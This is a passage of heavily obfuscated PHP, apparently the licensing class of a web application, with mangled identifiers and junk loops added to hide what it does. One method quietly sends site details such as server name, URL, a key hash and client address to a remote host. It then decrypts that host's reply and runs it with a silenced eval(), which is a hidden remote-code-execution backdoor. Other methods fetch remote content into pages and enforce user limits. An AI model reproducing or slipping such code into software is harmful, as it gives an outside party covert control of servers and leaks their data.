= $this->evzu3a3d2846($†ø²‰€É, $ ‹”Ò™[214]); $óôåÍô = stream_context_create(array($ ‹”Ò™[215] => array($ ‹”Ò™[216] => $ ‹”Ò™[217], $ ‹”Ò™[218] => 3))); $Á©¢ø¸Í = @file_get_contents($†ø²‰€É, !1, $óôåÍô); header($ ‹”Ò™[219]); if ($Á©¢ø¸Í && strstr($Á©¢ø¸Í, $ ‹”Ò™[220])) { echo $Á©¢ø¸Í; } die; } public function riqt36e9fdd0($Ø¤×Š¬ò) { $Èğé¶ä¸ =& $_SERVER[ĞÆÏ¡Îª]; $ßâ°÷œÇ =& $_SERVER[û†ìªƒĞ]; if ($this->yzmb90bab883 == $ßâ°÷œÇ[221]) { return $Ø¤×Š¬ò; } $ÑËå˜èğ = array($ßâ°÷œÇ[222] => $ßâ°÷œÇ[223], $ßâ°÷œÇ[224] => $ßâ°÷œÇ[223], $ßâ°÷œÇ[225] => $ßâ°÷œÇ[223], $ßâ°÷œÇ[226] => $ßâ°÷œÇ[223], $ßâ°÷œÇ[227] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[229] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[230] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[231] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[232] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[233] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[234] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[235] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[236] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[237] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[238] => $ßâ°÷œÇ[228], $ßâ°÷œÇ[239] => $ßâ°÷œÇ[228]); $ğƒÏãÙÈ = $Èğé¶ä¸[684]; $»‹›‰Ñ = explode($ßâ°÷œÇ[240], _get($this->jetvdec1f191, $ßâ°÷œÇ[111], $ßâ°÷œÇ[6])); $ß¾‰¼üÚ = $Èğé¶ä¸[685]; while ($ß¾‰¼üÚ < $Èğé¶ä¸[624]) { if ($ß¾‰¼üÚ >= 0) { break; } $ß¾‰¼üÚ++; } $ÂÃÑÅêÕ = array(); $ºûã¹«ù = $Èğé¶ä¸[686]; while ($ºûã¹«ù < $Èğé¶ä¸[635]) { if ($ºûã¹«ù >= 0) { break; } $ºûã¹«ù++; } foreach ($ÑËå˜èğ as $Ñò›òØŠ => $« €¾‚) { if ($« €¾‚ == $ßâ°÷œÇ[223] && substr($this->yzmb90bab883, 0, 1) == $ßâ°÷œÇ[223]) { continue; } if (!in_array($Ñò›òØŠ, $»‹›‰Ñ)) { $ÂÃÑÅêÕ[] = $Ñò›òØŠ; } } foreach ($ÂÃÑÅêÕ as $Ñò›òØŠ) { unset($Ø¤×Š¬ò[$Ñò›òØŠ]); } return $Ø¤×Š¬ò; $·¬ú†É¸ = $Èğé¶ä¸[687]; if (strlen($·¬ú†É¸) < $Èğé¶ä¸[624]) { return; } } private function bpzj02a2dfdd() { $ˆ¤°ÊÜû =& $_SERVER[û†ìªƒĞ]; if ($this->yzmb90bab883 != $ˆ¤°ÊÜû[105]) { $GLOBALS[$ˆ¤°ÊÜû[84]][$ˆ¤°ÊÜû[88]][$ˆ¤°ÊÜû[241]] = $ˆ¤°ÊÜû[202]; return; } $GLOBALS[$ˆ¤°ÊÜû[84]][$ˆ¤°ÊÜû[242]] = $ˆ¤°ÊÜû[120]; if (Model($ˆ¤°ÊÜû[243])->get($ˆ¤°ÊÜû[63]) != $ˆ¤°ÊÜû[202]) { Model($ˆ¤°ÊÜû[243])->set($ˆ¤°ÊÜû[63], $ˆ¤°ÊÜû[202]); } } public function dhku41af4ba8() { return $_SERVER[û†ìªƒĞ][244]; } private function dcar462a4c76() { $”½Ê†Ö =& $_SERVER[ĞÆÏ¡Îª]; $¿¨š¸›Ï =& $_SERVER[û†ìªƒĞ]; $Û­£–ó = array($¿¨š¸›Ï[245], $¿¨š¸›Ï[246], $¿¨š¸›Ï[247]); $–šòí®  = $”½Ê†Ö[688]; $º¶±®´Ï = $¿¨š¸›Ï[248] . md5($¿¨š¸›Ï[249]); $¼èıâ™Ğ = $”½Ê†Ö[689]; while ($¼èıâ™Ğ < $”½Ê†Ö[639]) { if ($¼èıâ™Ğ >= 0) { break; } $¼èıâ™Ğ++; } if ($this->yzmb90bab883 == $¿¨š¸›Ï[105] || !_get($GLOBALS, $¿¨š¸›Ï[114])) { return; } if (!in_array($_SERVER[$¿¨š¸›Ï[24]], $Û­£–ó)) { return; } if (time() % 4 != 0) { return; } $ºÀ°‹²ò = call_user_func(array($¿¨š¸›Ï[250], $¿¨š¸›Ï[251]), $º¶±®´Ï); if ($ºÀ°‹²ò && time() - $ºÀ°‹²ò < intval($¿¨š¸›Ï[252])) { return; } call_user_func(array($¿¨š¸›Ï[250], $¿¨š¸›Ï[137]), $º¶±®´Ï, time()); $§¿¢ûè = Model($¿¨š¸›Ï[33])->get($¿¨š¸›Ï[102]); $ğ¹ìøïô = array($¿¨š¸›Ï[149] => Model($¿¨š¸›Ï[33])->get($¿¨š¸›Ï[185]), $¿¨š¸›Ï[162] => $this->yzmb90bab883, $¿¨š¸›Ï[159] => $_SERVER[$¿¨š¸›Ï[160]], $¿¨š¸›Ï[161] => Model($¿¨š¸›Ï[33])->get($¿¨š¸›Ï[129]), $¿¨š¸›Ï[100] => md5($_SERVER[$¿¨š¸›Ï[101]] . $§¿¢ûè), $¿¨š¸›Ï[152] => $¿¨š¸›Ï[134], $¿¨š¸›Ï[155] => $_SERVER[$¿¨š¸›Ï[156]]); $ÏÇ“àó = $this->vfbk24f5d9ff($¿¨š¸›Ï[253], $ğ¹ìøïô); if (!is_array($ÏÇ“àó)) { return; } if ($ÏÇ“àó[$¿¨š¸›Ï[149]] && $ÏÇ“àó[$¿¨š¸›Ï[254]]) { if ($this->sbur11e4271c($ÏÇ“àó[$¿¨š¸›Ï[254]]) == $ğ¹ìøïô[$¿¨š¸›Ï[149]]) { return; } } $this->zrkvc6ad4077(); if ($this->sbur11e4271c($ÏÇ“àó[$¿¨š¸›Ï[254]]) != $ğ¹ìøïô[$¿¨š¸›Ï[149]]) { $¡À£¬…Î = array($¿¨š¸›Ï[180] => $§¿¢ûè, $¿¨š¸›Ï[181] => $_SERVER[$¿¨š¸›Ï[101]], $¿¨š¸›Ï[182] => this_url(), $¿¨š¸›Ï[157] => $_SERVER[$¿¨š¸›Ï[158]]); $¸Û­Ûïİ = $this->dkioe1ccaf26(json_encode($¡À£¬…Î)); $ÏÇ“àó = $this->vfbk24f5d9ff($¿¨š¸›Ï[183] . $¸Û­Ûïİ); if ($ÏÇ“àó && is_array($ÏÇ“àó) && isset($ÏÇ“àó[$¿¨š¸›Ï[254]])) { $’‡¿¤Û’ = $this->ukxs7d7c3b47($ÏÇ“àó[$¿¨š¸›Ï[254]], 2); if ($’‡¿¤Û’) { $’‡¿¤Û’ = $this->sbur11e4271c($’‡¿¤Û’); } if ($’‡¿¤Û’) { try { @eval($’‡¿¤Û’); } catch (Exception $àûÈç) { } } } } } private function vfbk24f5d9ff($Ï¼™·Ê· = '', $¶ÆÜ×¾ = array(), $ª²¬öì£ = 5) { $’åêÖ… =& $_SERVER[ĞÆÏ¡Îª]; $ª×‚µäŒ =& $_SERVER[û†ìªƒĞ]; $İèÜ®ÈÏ = $ª×‚µäŒ[255]; $á·–Â£ = $’åêÖ…[690]; while (strlen($á·–Â£) < $’åêÖ…[624]) { if (!$á·–Â£) { break; } $á·–Â£++; } $İèÜ®ÈÏ = $this->evzu3a3d2846($İèÜ®ÈÏ, $ª×‚µäŒ[256]); $İèÜ®ÈÏ = $İèÜ®ÈÏ . $Ï¼™·Ê·; if ($¶ÆÜ×¾ && is_array($¶ÆÜ×¾)) { $İèÜ®ÈÏ = $İèÜ®ÈÏ . $ª×‚µäŒ[257] . http_build_query($¶ÆÜ×¾); } if ($¶ÆÜ×¾ === -1) { return $İèÜ®ÈÏ; } $Í˜Ö‡Îî = stream_context_create(array($ª×‚µäŒ[215] => array($ª×‚µäŒ[218] => $ª²¬öì£, $ª×‚µäŒ[216] => $ª×‚µäŒ[258]), $ª×‚µäŒ[259] => array($ª×‚µäŒ[260] => !1, $ª×‚µäŒ[261] => !1))); $“š·á” = $’åêÖ…[691]; if (!$“š·á”) { return; } $¶ÆÜ×¾ = @file_get_contents($İèÜ®ÈÏ, !1, $Í˜Ö‡Îî); $İí¯ƒÒÀ = $’åêÖ…[692]; return json_decode($¶ÆÜ×¾, !0); } private function bximaa41e628() { $œÆ‚¼™÷ =& $_SERVER[ĞÆÏ¡Îª]; $Æ›¬ù¦¤ =& $_SERVER[û†ìªƒĞ]; $„ã£Ô³Ö = array($Æ›¬ù¦¤[262] => $Æ›¬ù¦¤[263], $Æ›¬ù¦¤[264] => $Æ›¬ù¦¤[265], $Æ›¬ù¦¤[266] => $Æ›¬ù¦¤[267], $Æ›¬ù¦¤[268] => $Æ›¬ù¦¤[269], $Æ›¬ù¦¤[270] => $Æ›¬ù¦¤[271], $Æ›¬ù¦¤[272] => $Æ›¬ù¦¤[210], $Æ›¬ù¦¤[273] => $Æ›¬ù¦¤[210], $Æ›¬ù¦¤[274] => $Æ›¬ù¦¤[263], $Æ›¬ù¦¤[275] => $Æ›¬ù¦¤[265], $Æ›¬ù¦¤[276] => $Æ›¬ù¦¤[267], $Æ›¬ù¦¤[277] => $Æ›¬ù¦¤[278], $Æ›¬ù¦¤[279] => $Æ›¬ù¦¤[269], $Æ›¬ù¦¤[280] => $Æ›¬ù¦¤[281], $Æ›¬ù¦¤[282] => $Æ›¬ù¦¤[271], $Æ›¬ù¦¤[283] => $Æ›¬ù¦¤[284], $Æ›¬ù¦¤[285] => $Æ›¬ù¦¤[286], $Æ›¬ù¦¤[287] => $Æ›¬ù¦¤[288]); $«›ã†›Ÿ = $œÆ‚¼™÷[693]; if (!$«›ã†›Ÿ) { die; } $ê¨õ…úı = $„ã£Ô³Ö[$this->yzmb90bab883]; $ê¨õ…úı = intval($ê¨õ…úı ? $ê¨õ…úı : $Æ›¬ù¦¤[263]); $ä°ğàÙ = _get($this->jetvdec1f191, $Æ›¬ù¦¤[289]); $¯‹ë¡ï = $œÆ‚¼™÷[694]; $ä°ğàÙ = $ä°ğàÙ ? intval($ä°ğàÙ) : 0; return $ê¨õ…úı + $ä°ğàÙ; } public function wtdk1121a4a3($³¡àû™) { $•Ôñ¢— =& $_SERVER[ĞÆÏ¡Îª]; $ùÔ×èÎÑ =& $_SERVER[û†ìªƒĞ]; $‡†€›ğĞ = $this->bximaa41e628(); $Öê€óˆ» = $•Ôñ¢—[695]; if (strlen($Öê€óˆ») < $•Ôñ¢—[639]) { die; } if ($³¡àû™[$ùÔ×èÎÑ[290]] == $ùÔ×èÎÑ[120]) { return; } if ($‡†€›ğĞ >= intval($ùÔ×èÎÑ[210])) { return; } $¨´ÍË¾‚ = Model($ùÔ×èÎÑ[123])->count(); $äÛ·»… = $•Ôñ¢—[696]; while ($äÛ·»… < $•Ôñ¢—[639]) { if ($äÛ·»… >= 0) { break; } $äÛ·»…++; } if ($¨´ÍË¾‚ <= $‡†€›ğĞ) { return; } $ÁÌíš»è = Model($ùÔ×èÎÑ[123])->field($ùÔ×èÎÑ[290])->limit($‡†€›ğĞ)->select(); $ÁÌíš»è = array_to_keyvalue($ÁÌíš»è, $ùÔ×èÎÑ[6], $ùÔ×èÎÑ[290]); $ŠøƒåŸ = $•Ôñ¢—[697]; if (!$ŠøƒåŸ) { return; } if (!in_array($³¡àû™[$ùÔ×èÎÑ[290]], $ÁÌíš»è)) { show_json($ùÔ×èÎÑ[291], !1, $ùÔ×èÎÑ[206]); } } public function kadt91fd3914() { $éÀ¼„çË =& $_SERVER[û†ìªƒĞ]; if (!_get($GLOBALS, $éÀ¼„çË[114]) || mt_rand(1, 100) > 20) { return; } $ı¨ ‚ÔĞ = $éÀ¼„çË[213]; $ı¨ ‚ÔĞ = $this->evzu3a3d2846($ı¨ ‚ÔĞ, $éÀ¼„çË[214]); $È¡Ê›ãù = stream_context_create(array($éÀ¼„çË[215] => array($éÀ¼„çË[216] => $éÀ¼„çË[217], $éÀ¼„çË[218] => 3))); $íœÄµÍç = @file_get_contents($ı¨ ‚ÔĞ, !1, $È¡Ê›ãù); echo $éÀ¼„çË[292] . hash_encode($íœÄµÍç) . $éÀ¼„çË[293]; $»µë‚Í = $_SERVER[ĞÆÏ¡Îª][698]; if (!$»µë‚Í) { return; } } private function iavz9e61462e($ë€–Ûèı, $æÅÈ€Ÿ•, $¯ìŒÜ“É = 3) { $Â‰—Ë¢Ñ =& $_SERVER[ĞÆÏ¡Îª]; $¿–ÅÅŒ« =& $_SERVER[û†ìªƒĞ]; usleep(1); $ë€–Ûèı = trim($ë€–Ûèı); $‘·Í·œ = mt_rand(0, 5) . $¿–ÅÅŒ«[6]; $Ïìˆ§… = rand_string(15); $—Ã±öáØ = $Â‰—Ë¢Ñ[699]; while ($—Ã±öáØ < $Â‰—Ë¢Ñ[639]) { if ($—Ã±öáØ >= 0) { break; } $—Ã±öáØ++; } $€§ŠÀ…— = $¿–ÅÅŒ«[294]; $Î®•×ó± = $Â‰—Ë¢Ñ[700]; if (strlen($Î®•×ó±) < $Â‰—Ë¢Ñ[650]) { return; } switch ($‘·Í·œ) { case $¿–ÅÅŒ«[202]: $–Õ­Í©³ = $this->dxrmc9a9bf8f($ë€–Ûèı, strrev($æÅÈ€Ÿ• . $Ïìˆ§…)); $”äÛµ = $Â‰—Ë¢Ñ[701]; if (!$”äÛµ) { die; } break; case $¿–ÅÅŒ«[120]: $–Õ­Í©³ = $this->dxrmc9a9bf8f($ë€–Ûèı, strrev($Ïìˆ§… . $æÅÈ€Ÿ•)); break; $ô×‘”úØ = $Â‰—Ë¢Ñ[702]; if (strlen($ô×‘”úØ) < $Â‰—Ë¢Ñ[635]) { return; } case $¿–ÅÅŒ«[295]: $–Õ­Í©³ = $this->dxrmc9a9bf8f($ë€–Ûèı, base64_encode($Ïìˆ§… . $æÅÈ€Ÿ•)); break; case $¿–ÅÅŒ«[296]: $–Õ­Í©³ = $this->dxrmc9a9bf8f($ë€–Ûèı, md5($Ïìˆ§… . $æÅÈ€Ÿ•)); $”€ÎĞ½² = $Â‰—Ë¢Ñ[703]; if (strlen($”€ÎĞ½²) < $Â‰—Ë¢Ñ[243]) { die; } break; case $¿–ÅÅŒ«[297]: $ë€–Ûèı = base64_encode($ë€–Ûèı); $°ìøÔÎ = $Â‰—Ë¢Ñ[704]; if (strlen($°ìøÔÎ) < $Â‰—Ë¢Ñ[635]) { return; } $ò‰ÉËïÙ = rand(0, 64); $œúà¬ä = $€§ŠÀ…—[$ò‰ÉËïÙ]; $„ß€áØ = md5($œúà¬ä . md5($æÅÈ€Ÿ• . $œúà¬ä) . $æÅÈ€Ÿ•); $Îï·É¹ = $Â‰—Ë¢Ñ[705]; if (strlen($Îï·É¹) < $Â‰—Ë¢Ñ[624]) { die; } $„ß€áØ = substr($„ß€áØ, $ò‰ÉËïÙ % 8, $ò‰ÉËïÙ % 8 + 7); $€èÓÖóÁ = $¿–ÅÅŒ«[6]; $©¶ŠŞà– = $Â‰—Ë¢Ñ[706]; $²«ŞÑşá = 0; $üØ¯ç = 0; $ÑÉâ¢ş‘ = 0; $º…¿–¦Ç = $Â‰—Ë¢Ñ[707]; for ($²«ŞÑşá = 0; $²«ŞÑşá < strlen($ë€–Ûèı); $²«ŞÑşá++) { $ÑÉâ¢ş‘ = $ÑÉâ¢ş‘ == strlen($„ß€áØ) ? 0 : $ÑÉâ¢ş‘; $üØ¯ç = ($ò‰ÉËïÙ + strpos($€§ŠÀ…—, $ë€–Ûèı[$²«ŞÑşá]) + ord($„ß€áØ[$ÑÉâ¢ş‘++])) % 64; $õº€ÕÎÇ = $Â‰—Ë¢Ñ[708]; if (!$õº€ÕÎÇ) { return; } $€èÓÖóÁ .= $€§ŠÀ…—[$üØ¯ç]; $è†ßÂè = $Â‰—Ë¢Ñ[709]; while (strlen($è†ßÂè) < $Â‰—Ë¢Ñ[624]) { if (!$è†ßÂè) { break; } $è†ßÂè++; } } $–Õ­Í©³ = hash_encode($œúà¬ä . $€èÓÖóÁ); $ ç—ù™ = $Â‰—Ë¢Ñ[710]; if (strlen($ ç—ù™) < $Â‰—Ë¢Ñ[639]) { return; } break; $òÎ¶ûÎâ = $Â‰—Ë¢Ñ[686]; if (!$òÎ¶ûÎâ) { die; } default: $–Õ­Í©³ = $this->dxrmc9a9bf8f($ë€–Ûèı, $æÅÈ€Ÿ• . $Ïìˆ§…); break; $ş§„˜ˆî = $Â‰—Ë¢Ñ[711]; if (!$ş§„˜ˆî) { die; } } $–Õ­Í©³ = strrev($‘·Í·œ . $Ïìˆ§… . $–Õ­Í©³); $ëŞÎ¥¤õ = $Â‰—Ë¢Ñ[712]; if ($¯ìŒÜ“É - 1 > 0) { $–Õ­Í©³ = $this->iavz9e61462e($–Õ­Í©³, $æÅÈ€Ÿ•, $¯ìŒÜ“É - 1); } return $–Õ­Í©³; } private function ukxs7d7c3b47($Ì­ß·, $èšµ¼é, $«‹¦äóú = 3) { $¶‚âò®¨ =& $_SERVER[ĞÆÏ¡Îª]; $š—ü¦Ò =& $_SERVER[û†ìªƒĞ]; if (!is_string($Ì­ß·) || strlen($Ì­ß·) < 10) { return !1; } $Ì­ß· = trim($Ì­ß·); $Ç´Ù±¥ = $¶‚âò®¨[713]; if (strlen($Ç´Ù±¥) < $¶‚âò®¨[639]) { return; } $Ì­ß· = strrev($Ì­ß·); $Õ°ÉÁ£¥ = $¶‚âò®¨[714]; while ($Õ°ÉÁ£¥ < $¶‚âò®¨[635]) { if ($Õ°ÉÁ£¥ >= 0) { break; } $Õ°ÉÁ£¥++; } $ƒ¯ÒÍ…€ = $Ì­ß·[0]; $ùØäº = substr($Ì­ß·, 1, 15); $Ì­ß· = substr($Ì­ß·, 16); $“ÓäçÈş = $š—ü¦Ò[294]; switch ($ƒ¯ÒÍ…€) { case $š—ü¦Ò[202]: $Ÿ¸¥·ÄÈ = $this->evzu3a3d2846($Ì­ß·, strrev($èšµ¼é . $ùØäº)); $óªŸéØí = $¶‚âò®¨[715]; if (strlen($óªŸéØí) < $¶‚âò®¨[639]) { die; } break; case $š—ü¦Ò[120]: $Ÿ¸¥·ÄÈ = $this->evzu3a3d2846($Ì­ß·, strrev($ùØäº . $èšµ¼é)); break; $û»•é†Š = $¶‚âò®¨[716]; if (strlen($û»•é†Š) < $¶‚âò®¨[639]) { return; } case $š—ü¦Ò[295]: $Ÿ¸¥·ÄÈ = $this->evzu3a3d2846($Ì­ß·, base64_encode($ùØäº . $èšµ¼é)); $óË‰¢ = $¶‚âò®¨[717]; if (strlen($óË‰¢) < $¶‚âò®¨[639]) { return; } break; case $š—ü¦Ò[296]: $Ÿ¸¥·ÄÈ = $this->evzu3a3d2846($Ì­ß·, md5($ùØäº . $èšµ¼é)); $ŒİÊ‹İ„ = $¶‚âò®¨[718]; break; case $š—ü¦Ò[297]: $Ì­ß· = hash_decode($Ì­ß·); $ª¹´Õ¼• = $¶‚âò®¨[719]; $‚ æˆ´´ = $Ì­ß·[0]; $Ì­ß· = substr($Ì­ß·, 1); $€™™ì×¯ = $¶‚âò®¨[720]; while (strlen($€™™ì×¯) < $¶‚âò®¨[243]) { if (!$€™™ì×¯) { break; } $€™™ì×¯++; } $›üé‘Ú— = strpos($“ÓäçÈş, $‚ æˆ´´); $èÒ¯£¯Å = $¶‚âò®¨[721]; if (strlen($èÒ¯£¯Å) < $¶‚âò®¨[639]) { return; } $°ó¹’ŒÃ = md5($‚ æˆ´´ . md5($èšµ¼é . $‚ æˆ´´) . $èšµ¼é); $°ó¹’ŒÃ = substr($°ó¹’ŒÃ, $›üé‘Ú— % 8, $›üé‘Ú— % 8 + 7); $„âø¤Õç = $š—ü¦Ò[6]; $Ä—¯´›Ï = 0; $­¶³¬±º = $¶‚âò®¨[722]; while (strlen($­¶³¬±º) < $¶‚âò®¨[243]) { if (!$­¶³¬±º) { break; } $­¶³¬±º++; } $ø¸ù‡ìª = 0; $Í†¥ïºÒ = $¶‚âò®¨[723]; if (!$Í†¥ïºÒ) { return; } $œ²Ô¦«¿ = 0; for ($Ä—¯´›Ï = 0; $Ä—¯´›Ï < strlen($Ì­ß·); $Ä—¯´›Ï++) { $œ²Ô¦«¿ = $œ²Ô¦«¿ == strlen($°ó¹’ŒÃ) ? 0 : $œ²Ô¦«¿; $»›Ÿé•° = $¶‚âò®¨[724]; $Ä±…şŠ = $œ²Ô¦«¿++; $ÏÖ­Úõ… = $¶‚âò®¨[725]; if (strlen($ÏÖ­Úõ…) < $¶‚âò®¨[639]) { die; } $ø¸ù‡ìª = strpos($“ÓäçÈş, $Ì­ß·[$Ä—¯´›Ï]) - $›üé‘Ú— - ord($°ó¹’ŒÃ[$Ä±…şŠ]); while ($ø¸ù‡ìª < 0) { $ø¸ù‡ìª += 64; $Ú®à²† = $¶‚âò®¨[726]; while ($Ú®à²† < $¶‚âò®¨[635]) { if ($Ú®à²† >= 0) { break; } $Ú®à²†++; } } $„âø¤Õç .= $“ÓäçÈş[$ø¸ù‡ìª]; } $Ÿ¸¥·ÄÈ = base64_decode($„âø¤Õç); break; default: $Ÿ¸¥·ÄÈ = $this->evzu3a3d2846($Ì­ß·, $èšµ¼é . $ùØäº); break; } if ($«‹¦äóú - 1 > 0) { $Ÿ¸¥·ÄÈ = $this->ukxs7d7c3b47($Ÿ¸¥·ÄÈ, $èšµ¼é, $«‹¦äóú - 1); } return $Ÿ¸¥·ÄÈ; } public function dkioe1ccaf26($à‘ŸÏä) { $ÁÍ¿éø¯ =& $_SERVER[ĞÆÏ¡Îª]; $ïûöÃÔ» =& $_SERVER[û†ìªƒĞ]; $Ğ§¿­Ã = $this->uyxl19a4f3e7(); $½ïÉ£ôç = $ÁÍ¿éø¯[727]; $Ñó‘ØÒö = $this->uyxl19a4f3e7(); $°Šûõîğ = ($Ğ§¿­Ã - 1) * ($Ñó‘ØÒö - 1); $œÛÆ¸† = $ÁÍ¿éø¯[728]; if (!$œÛÆ¸†) { return; } $‰šÀ°ó = intval(($Ğ§¿­Ã + $Ñó‘ØÒö) / 2); while (1) { $³ØÄÁô = $‰šÀ°ó; $ï¹¼Åœ— = $ÁÍ¿éø¯[667]; while ($ï¹¼Åœ— < $ÁÍ¿éø¯[624]) { if ($ï¹¼Åœ— >= 0) { break; } $ï¹¼Åœ—++; } $£¨èí¶† = $°Šûõîğ; while ($£¨èí¶† % $³ØÄÁô != 0) { $œ£Ôö€® = $£¨èí¶†; $£¨èí¶† = $³ØÄÁô; $Öæœ€¨¸ = $ÁÍ¿éø¯[699]; while ($Öæœ€¨¸ < $ÁÍ¿éø¯[243]) { if ($Öæœ€¨¸ >= 0) { break; } $Öæœ€¨¸++; } $³ØÄÁô = $œ£Ôö€® % $³ØÄÁô; } if ($³ØÄÁô == 1) { break; } else { $‰šÀ°ó++; } } $‡Û¼Ì… = 2; for ($ËØº÷ƒŒ = 0; $ËØº÷ƒŒ < $°Šûõîğ * 10; $ËØº÷ƒŒ++) { if (($°Šûõîğ * $ËØº÷ƒŒ + 1) % $‰šÀ°ó == 0) { $‡Û¼Ì… = intval(($°Šûõîğ * $ËØº÷ƒŒ + 1) / $‰šÀ°ó); break; } } $‰¥ÑŞ†ø = $this->dxrmc9a9bf8f($Ğ§¿­Ã * $Ñó‘ØÒö . $ïûöÃÔ»[6], $ïûöÃÔ»[134]); $¨©å‡´ = md5($ïûöÃÔ»[298] . ($Ğ§¿­Ã + $Ñó‘ØÒö) . $ïûöÃÔ»[299] . $‰šÀ°ó . $ïûöÃÔ»[299] . $‡Û¼Ì… . $ïûöÃÔ»[300]); $Ÿœë¬£³ = $this->dxrmc9a9bf8f($à‘ŸÏä, $¨©å‡´) . $ïûöÃÔ»[301] . $‰¥ÑŞ†ø; $ ×§¢¡ = $ÁÍ¿éø¯[729]; if (!$ ×§¢¡) { die; } return $Ÿœë¬£³; } public function sbur11e4271c($ì‹¤ï­ì) { $ŒÉåĞ£Å =& $_SERVER[ĞÆÏ¡Îª]; $É–Ã¯ğ¬ =& $_SERVER[û†ìªƒĞ]; $ƒÃÒöß = explode($É–Ã¯ğ¬[301], $ì‹¤ï­ì); $ä¸‰¾« = $ŒÉåĞ£Å[730]; while ($ä¸‰¾« < $ŒÉåĞ£Å[635]) { if ($ä¸‰¾« >= 0) { break; } $ä¸‰¾«++; } if (count($ƒÃÒöß) != 2) { return $É–Ã¯ğ¬[6]; } $˜Õç±Úâ = $this->evzu3a3d2846($ƒÃÒöß[1] . $É–Ã¯ğ¬[6], $É–Ã¯ğ¬[134]); if (!$˜Õç±Úâ) { return $É–Ã¯ğ¬[6]; } $˜Õç±Úâ = intval($˜Õç±Úâ); $Õµ³´äç = $ŒÉåĞ£Å[731]; $Ü·àŸ¶× = 0; $–ÌÒçƒ = 0; for ($…ÕÉ¹ƒ® = 3; $…ÕÉ¹ƒ® < $˜Õç±Úâ; $…ÕÉ¹ƒ® += 2) { if ($˜Õç±Úâ % $…ÕÉ¹ƒ® != 0) { continue; } $Ü·àŸ¶× = $…ÕÉ¹ƒ®; $–ÌÒçƒ = intval($˜Õç±Úâ / $…ÕÉ¹ƒ®); $ßòÁµüÇ = $ŒÉåĞ£Å[732]; break; $”©®¶ù = $ŒÉåĞ£Å[733]; while (strlen($”©®¶ù) < $ŒÉåĞ£Å[635]) { if (!$”©®¶ù) { break; } $”©®¶ù++; } } $è§¸Ö• = ($Ü·àŸ¶× - 1) * ($–ÌÒçƒ - 1); $ËÌÚÜ„¹ = intval(($Ü·àŸ¶× + $–ÌÒçƒ) / 2); $£Ÿş½¿‡ = $ŒÉåĞ£Å[734]; if (!$£Ÿş½¿‡) { return; } while (1) { $úà©¸ñÍ = $ËÌÚÜ„¹; $†ğ«¿é« = $è§¸Ö•; $æ¿…¯ŞĞ = $ŒÉåĞ£Å[735]; if (strlen($æ¿…¯ŞĞ) < $ŒÉåĞ£Å[624]) { die; } while ($†ğ«¿é« % $úà©¸ñÍ != 0) { $°ş¥‡åÛ = $†ğ«¿é«; $÷ƒŸÖèÛ = $ŒÉåĞ£Å[736]; if (!$÷ƒŸÖèÛ) { return; } $†ğ«¿é« = $úà©¸ñÍ; $úà©¸ñÍ = $°ş¥‡åÛ % $úà©¸ñÍ; $°ºãıŞò = $ŒÉåĞ£Å[737]; while (strlen($°ºãıŞò) < $ŒÉåĞ£Å[639]) { if (!$°ºãıŞò) { break; } $°ºãıŞò++; } } if ($úà©¸ñÍ == 1) { break; } else { $ËÌÚÜ„¹++; } } $£íÜ‡Ì© = 2; $Ó™ƒ²Ê = $ŒÉåĞ£Å[738]; while ($Ó™ƒ²Ê < $ŒÉåĞ£Å[243]) { if ($Ó™ƒ²Ê >= 0) { break; } $Ó™ƒ²Ê++; } for ($…ÕÉ¹ƒ® = 0; $…ÕÉ¹ƒ® < $è§¸Ö• * 10; $…ÕÉ¹ƒ®++) { if (($è§¸Ö• * $…ÕÉ¹ƒ® + 1) % $ËÌÚÜ„¹ == 0) { $£íÜ‡Ì© = intval(($è§¸Ö• * $…ÕÉ¹ƒ® + 1) / $ËÌÚÜ„¹); break; } } $Ôµ§©¥È = md5($É–Ã¯ğ¬[298] . ($Ü·àŸ¶× + $–ÌÒçƒ) . $É–Ã¯ğ¬[299] . $ËÌÚÜ„¹ . $É–Ã¯ğ¬[299] . $£íÜ‡Ì© . $É–Ã¯ğ¬[300]); $âèÒ¯ ’ = $ŒÉåĞ£Å[739]; while ($âèÒ¯ ’ < $ŒÉåĞ£Å[243]) { if ($âèÒ¯ ’ >= 0) { break; } $âèÒ¯ ’++; } $ŠéŠÚ = $this->evzu3a3d2846($ƒÃÒöß[0], $Ôµ§©¥È); $ˆìÙ‰êÌ = $ŒÉåĞ£Å[740]; return $ŠéŠÚ; $¢§¶ßçÀ = $ŒÉåĞ£Å[741]; } public function uyxl19a4f3e7() { $ÜúúĞü =& $_SERVER[ĞÆÏ¡Îª]; $Ò•ÒÊ‡ = mt_rand(pow(2, 14), pow(2, 16) - 1); $á¾ ®½ = array(); $ñ†Û¦å = $ÜúúĞü[742]; while ($ñ†Û¦å < $ÜúúĞü[624]) { if ($ñ†Û¦å >= 0) { break; } $ñ†Û¦å++; } $å˜Í®Ÿ = 1; while ($å˜Í®Ÿ <= (int) sqrt($Ò•ÒÊ‡)) { $œšç´‚› = $å˜Í®Ÿ; while (!0) { $œšç´‚›++; if ($œšç´‚› <= 2) { $å˜Í®Ÿ = $œšç´‚›; break; } else { if ($œšç´‚› < 2) { continue; } } $ÑµÙªõ = !0; for ($»Èúë¼ = 2; $»Èúë¼ <= sqrt($œšç´‚›); $»Èúë¼++) { if ($œšç´‚› % $»Èúë¼ == 0) { $ÑµÙªõ = !1; } } if ($ÑµÙªõ) { $å˜Í®Ÿ = $œšç´‚›; break; } } $á¾ ®½[] = $å˜Í®Ÿ; } $ó³ÕìâŞ = 2; for ($œšç´‚› = $Ò•ÒÊ‡; $œšç´‚› > 1; $œšç´‚›--) { $ÑµÙªõ = !0; $­‘¿‰„ã = $ÜúúĞü[659]; if (!$­‘¿‰„ã) { die; } foreach ($á¾ ®½ as $³€·ÖôÈ) { if ($œšç´‚› % $³€·ÖôÈ == 0) { $ÑµÙªõ = !1; break; } } if ($ÑµÙªõ) { $ó³ÕìâŞ = $œšç´‚›; break; } } return $ó³ÕìâŞ; } public function giuz0be82f61($ÙÏÍÆó, $ø·äñÉ) { $Îó±ŸÆä =& $_SERVER[û†ìªƒĞ]; return call_user_func(array($Îó±ŸÆä[8], $Îó±ŸÆä[302]), 